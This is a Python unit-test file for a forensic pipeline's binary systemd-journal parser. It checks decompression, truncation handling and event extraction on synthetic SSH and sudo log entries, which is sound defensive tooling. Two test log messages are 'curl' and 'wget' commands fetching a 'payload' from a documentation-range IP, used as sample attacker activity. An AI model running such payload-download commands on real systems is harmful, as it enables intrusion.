from __future__ import annotations

import importlib.util
import json
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from tests.journal_fixture import JournalBuilder, lz4_literal_block
from tq_ext.parsers import journal_binary
from uac_parser.pipeline import run_pipeline

BASE = 1_772_356_500_000_000  # 2026-03-01T09:15:00Z
HAVE_ZSTD = importlib.util.find_spec("zstandard") is not None


def _parse(data: bytes, relative: str = "var/log/journal/id/system.journal") -> list:
    with tempfile.TemporaryDirectory() as directory:
        path = Path(directory) / "system.journal"
        path.write_bytes(data)
        return journal_binary.parse(path, relative)


def _sample(builder: JournalBuilder) -> bytes:
    builder.message(
        BASE,
        "Accepted publickey for alice from 203.0.113.7 port 50022 ssh2",
        _HOSTNAME="web01",
        SYSLOG_IDENTIFIER="sshd",
        _PID="4242",
        _UID="0",
        _SYSTEMD_UNIT="ssh.service",
    )
    builder.message(
        BASE + 1_500_000,
        "   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/id",
        _HOSTNAME="web01",
        SYSLOG_IDENTIFIER="sudo",
        _PID="4300",
    )
    return builder.build()


class JournalBinaryParserTests(unittest.TestCase):
    def test_regular_and_compact_files_decode_to_the_same_events(self) -> None:
        regular = _parse(_sample(JournalBuilder()))
        compact = _parse(_sample(JournalBuilder(compact=True)))

        self.assertEqual(len(regular), 2)
        self.assertEqual(
            [(e.timestamp, e.event_action, e.summary) for e in regular],
            [(e.timestamp, e.event_action, e.summary) for e in compact],
        )
        login, sudo = regular
        self.assertEqual(login.timestamp, "2026-03-01T09:15:00Z")
        self.assertEqual(login.event_action, "ssh_login_success")
        self.assertEqual(login.user, "alice")
        self.assertEqual(login.src_ip, "203.0.113.7")
        self.assertEqual(login.host, "web01")
        self.assertEqual(login.process, "sshd")
        self.assertEqual(login.pid, "4242")
        self.assertEqual(login.uid, "0")
        self.assertEqual(login.source_type, "journal_binary")
        self.assertEqual(login.timezone_confidence, "source_epoch")
        self.assertEqual(login.extra["systemd_unit"], "ssh.service")
        self.assertEqual(login.extra["seqnum"], 1)
        self.assertIn("sshd[4242]: Accepted publickey", login.raw)
        self.assertEqual(sudo.timestamp, "2026-03-01T09:15:01.500000Z")
        self.assertEqual(sudo.event_action, "sudo_command")
        self.assertEqual(sudo.command, "/usr/bin/id")

    def test_xz_and_lz4_payloads_are_decompressed(self) -> None:
        long_message = "curl http://203.0.113.9/payload " + "A" * 900
        for compression in ("xz", "lz4"):
            with self.subTest(compression=compression):
                builder = JournalBuilder(compact=True)
                builder.message(
                    BASE, long_message, compression, SYSLOG_IDENTIFIER="bash"
                )
                events = _parse(builder.build())

                self.assertEqual(len(events), 1)
                self.assertEqual(events[0].summary, long_message)

    @unittest.skipUnless(HAVE_ZSTD, "zstandard is not installed")
    def test_zstd_payloads_are_decompressed(self) -> None:
        long_message = "wget http://203.0.113.9/payload " + "B" * 900
        builder = JournalBuilder()
        builder.message(BASE, long_message, "zstd", SYSLOG_IDENTIFIER="bash")

        events = _parse(builder.build())

        self.assertEqual([event.summary for event in events], [long_message])

    def test_missing_zstd_decoder_is_reported_instead_of_dropped(self) -> None:
        builder = JournalBuilder()
        builder.message(
            BASE, "hidden", "zstd-opaque", SYSLOG_IDENTIFIER="bash", _PID="7"
        )
        with mock.patch.object(journal_binary, "ZSTD_DECODER", None):
            events = _parse(builder.build())

        entry, coverage = events
        self.assertEqual(entry.process, "bash")
        self.assertIn("without MESSAGE", entry.summary)
        self.assertEqual(coverage.event_action, "journal_partially_decoded")
        self.assertEqual(
            coverage.extra["undecoded_fields"], {"zstd_decoder_missing": 1}
        )
        self.assertIn("zstandard", coverage.summary)

    def test_lz4_block_with_overlapping_match(self) -> None:
        # literals "ab", then a 10-byte match at distance 2, then literals "c".
        block = bytes([0x26, ord("a"), ord("b"), 0x02, 0x00, 0x10, ord("c")])

        self.assertEqual(
            journal_binary.lz4_block_decompress(block, 13), b"ab" * 6 + b"c"
        )
        self.assertEqual(
            journal_binary.lz4_block_decompress(lz4_literal_block(b"x" * 300), 300),
            b"x" * 300,
        )
        with self.assertRaises(ValueError):
            journal_binary.lz4_block_decompress(block, 5)

    def test_truncated_file_keeps_readable_entries_and_reports_the_gap(self) -> None:
        builder = JournalBuilder(state=1)
        data = _sample(builder)
        builder.message(BASE + 9_000_000, "never fully written", SYSLOG_IDENTIFIER="x")
        full = builder.build()
        truncated = full[: len(data) + 40]

        events = _parse(truncated)

        self.assertEqual(
            [event.event_action for event in events],
            ["ssh_login_success", "sudo_command", "journal_partially_decoded"],
        )
        coverage = events[-1]
        self.assertTrue(coverage.extra["truncated"])
        self.assertEqual(coverage.extra["journal_state"], "online")
        self.assertEqual(coverage.extra["header_entries"], 3)
        self.assertEqual(coverage.extra["recovered_entries"], 2)

    def test_dangling_field_reference_does_not_abort_the_entry(self) -> None:
        builder = JournalBuilder()
        message = builder.data("MESSAGE", "Started nightly.service")
        builder.entry(BASE, [message, 0xFFFFF8])

        entry, coverage = _parse(builder.build())

        self.assertEqual(entry.event_action, "service_started")
        self.assertEqual(coverage.extra["undecoded_fields"], {"dangling_reference": 1})

    def test_rejects_non_journal_and_unknown_incompatible_flags(self) -> None:
        with self.assertRaises(journal_binary.JournalFormatError):
            _parse(b"LPKSHHRH")
        data = bytearray(_sample(JournalBuilder()))
        data[12:16] = (1 << 9).to_bytes(4, "little")
        with self.assertRaises(journal_binary.JournalFormatError):
            _parse(bytes(data))
        self.assertEqual(_parse(b""), [])

    def test_pipeline_parses_native_journal_sources(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory) / "collection"
            (root / "var/log/journal/id").mkdir(parents=True)
            (root / "var/log/journal/id/system.journal").write_bytes(
                _sample(JournalBuilder(compact=True))
            )
            output = Path(directory) / "out"

            result = run_pipeline(root, output, year=2026)
            source_index = json.loads((output / "source_index.json").read_text())
            timeline = [
                json.loads(line)
                for line in (output / "timeline_full.jsonl").read_text().splitlines()
            ]

        source = next(
            item
            for item in source_index["sources"]
            if item["source_type"] == "journal_binary"
        )
        self.assertEqual(result.errors, 0)
        self.assertEqual(source["parser_status"], "parsed")
        self.assertEqual(source["event_count"], 2)
        actions = {event["event_action"] for event in timeline}
        self.assertLessEqual({"ssh_login_success", "sudo_command"}, actions)


if __name__ == "__main__":
    unittest.main()
